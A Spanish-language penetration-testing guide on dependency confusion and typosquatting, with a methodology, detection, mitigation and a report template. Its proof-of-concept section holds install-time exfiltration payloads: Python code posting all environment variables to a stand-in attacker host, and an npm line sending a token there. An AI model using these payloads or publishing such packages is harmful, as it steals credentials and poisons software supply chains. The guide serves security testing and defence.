# Dependency Confusion y Typosquatting

## Resumen

**Qué es:**

- **Dependency Confusion:** Ataque en el que se sube a un repositorio público un paquete con el mismo nombre que uno privado, de manera que build systems y gestores de dependencias (pypi/npm/yarn/go modules) descargan e instalan el paquete malicioso en lugar del interno.
- **Typosquatting:** Subida de paquetes con nombres similares (typos, variantes, caracteres) a populares para que usuarios, scripts, o integraciones los instalen por error.

**Por qué importa:** Ambos permiten la ejecución remota de código, robo de credenciales/API keys, persistencia y supply-chain attacks.
**Cuándo aplicarlo:** Relevante para microservicios, CI/CD, apps cloud-native y cualquier caso donde el sistema dependa de paquetes internos con nombres fácilmente reproducibles.

---

## Contexto

**Supuestos:**

- La aplicación usa gestores estándares (npm, pip, Maven, NuGet, Go Modules, RubyGems).
- El entorno build puede consultar registries públicos y privados.
- Acceso para forzar builds en el pipeline CI/CD o exponer el archivo de dependencias.
- Herramientas: Package Hunter, Typosquatting Checkers, PyPI/NPM search, Burp Suite, attack scripts.

**Límites:**

- No cubre exploits directos en binarios, solo en la cadena de dependencias/paquetería.
- Foco en inyección/preferencia inadvertida de paquetes públicos sobre privados.

---

## Metodología

1. **Descubrimiento de dependencias internas:**
   - Revisar manifests (package.json, requirements.txt, go.mod, pom.xml).
   - Buscar en scripts de inicio y builds referencias a paquetes no publicados.
   - Forzar errores 404 en registros públicos: `pip install privatepackage`, `npm info @org/private`.
2. **Verificación de acceso y resolución:**
   - Testear si los builds y scripts consultan primero el registry público antes que el privado.
   - Añadir/mover dependencias con control de versiones ambiguo (`*`, `latest`, sin scope).
3. **Prueba de ataque Dependency Confusion:**
   - Subir un paquete público (`npm publish`, `pip upload`, `gem push`) con el mismo nombre que uno privado observado.
   - Incluir payload de exfiltración de datos, pingback, o comandos maliciosos.
   - Lanzar build o forzar integración para ver si se descarga/ejecuta el paquete alterado.
4. **Typosquatting:**
   - Identificar dependencias críticas y crear variantes (ej: `request` → `requset`, `boto3` → `b0to3`).
   - Subir paquetes simulados con payload benigno para tracking.
   - Monitorizar instalaciones/descargas/telemetría.
5. **Explotación repetida:**
   - Automatizar la búsqueda de nombres “confusos” recién disponibles en los repositorios.
   - Usar tools de hunting para nuevas entradas vulnerables.

**Checklist rápida:**

- Existen referencias a repositorios privados en archivos de dependencias.
- Builds permiten resolver dependencias en orden público→privado.
- No hay validación de source del paquete al instalar.
- Nombres de dependencias internas no son únicos y aparecen en registros de errores/logs.
- Respuesta del sistema build ante paquetes maliciosos subidos al registry público.

---

## Pruebas Manuales

### Dependency Confusion

**1. Buscar dependencias internas**

```bash
grep @org/ package.json
cat requirements.txt | grep -E "internal|priv|corp"
```

**2. Publicar paquete malicioso**

```bash
cd fake-package
npm publish       # o python3 setup.py sdist upload
# payload en index.js/__init__.py: POST/GET con datos del entorno
```

**3. Forzar build/instalación**

- Lanzar CI/CD, observar si se baja y ejecuta código del paquete público.
- Revisar logs de instalación y comandos ejecutados (conexión saliente).

### Typosquatting

**1. Identificar dependencias populares**

- Buscar paquetes más usados en package managers (npm trends, PyPI downloads).

**2. Crear variantes y publicarlas**

- Cambiar orden/lenguaje/números: `dotenv` → `doenvt`, `async` → `asynq`, etc.

**3. Trackear instalaciones**

- Agregar beacon o request HTTP a server controlado en el setup/install script.
- Analizar logs tras publicar el paquete.

---

## PoC Automatizada

**Python - Subida y uso de paquete falso**

```python
from setuptools import setup

setup(
    name='privatepackage',
    version='1.0.0',
    packages=['privatepackage'],
    install_requires=[],
    # Payload en setup.py para exfiltración
)
# python3 setup.py sdist upload -r https://upload.pypi.org/legacy/
```

- Payload en `__init__.py`:

```python
import requests, os
def exfiltrate():
    requests.post('https://atacante.com/exfil', json=os.environ)
exfiltrate()
```

**NPM ejemplo**

```js
// index.js
require('https').get('https://atacante.com?token='+process.env.TOKEN)
// npm publish
```

---

## Explotación y Automatización

- Publicar variantes de nombre para monitorizar cuántos sistemas los instalan por error.
- Automatizar subida a diferentes managers y observar actividad (configurar callbacks/bot).
- Integrar con plataformas de monitorización de supply chain para detectar typosquatting.

---

## Impacto

- **RCE en CI/CD:** Ejecución remota durante el build/deploy.
- **Credential theft:** Exfiltración de API keys, secrets, secrets cloud, variables de entorno.
- **Persistencia:** Instalación de código malicioso oculto durante ciclos no supervisados.
- **Supply Chain Poisoning:** Apps confiadas, máquinas de clientes, repositorios infectados globalmente.

**Mapeo OWASP/CWE:** API Supply Chain, CWE-494 Download of Code Without Integrity Check, CWE-829 Inclusion of Functionality from Untrusted Control Sphere.

---

## Detección

- Logs de instalación de paquetes inesperados/no firmados.
- Alertas de beacon/callback en tráfico de red CI/CD.
- Uso de herramientas tipo Dependency Track, Sonatype Nexus Firewall.
- Revisar historial/reciente actividad de registros públicos y blogs de seguridad de proveedores.

---

## Mitigación

- Scoping/Namespacing estricto en dependencias internas (`@org/paquete`).
- Configurar el gestor para nunca consultar registros públicos salvo indicación explícita.
- Especificar la source del package (lockfiles bloqueados, repositorios internos).
- Monitorizar nombres similares públicos y alertar al crearlos.
- Automatizar secret scanning y desinfección tras detección abusiva.

---

## Errores Comunes

- Usar nombres internos no únicos/fáciles sin private registry by default.
- No bloquear resolución público→privado en clientes build/package.
- Exponer referencias privadas en logs abiertos.
- Omitir validación tras instalación (checksums, firmas).

---

## Reporte

**Título:** Dependency Confusion y Typosquatting permiten RCE y filtrado de secretos por paquetes maliciosos
**Impacto:** Supply chain attack, ejecución remota, credential theft, persistencia
**Pasos:**

1. Buscar dependencias internas y falta de scoping
2. Publicar paquete malicioso/nombre typo en registro público
3. Forzar build/reposync y observar ejecuciones
   **Mitigación:** Configuración estricta, lockfiles, scoping privado, validación/firma y monitorización avanzada
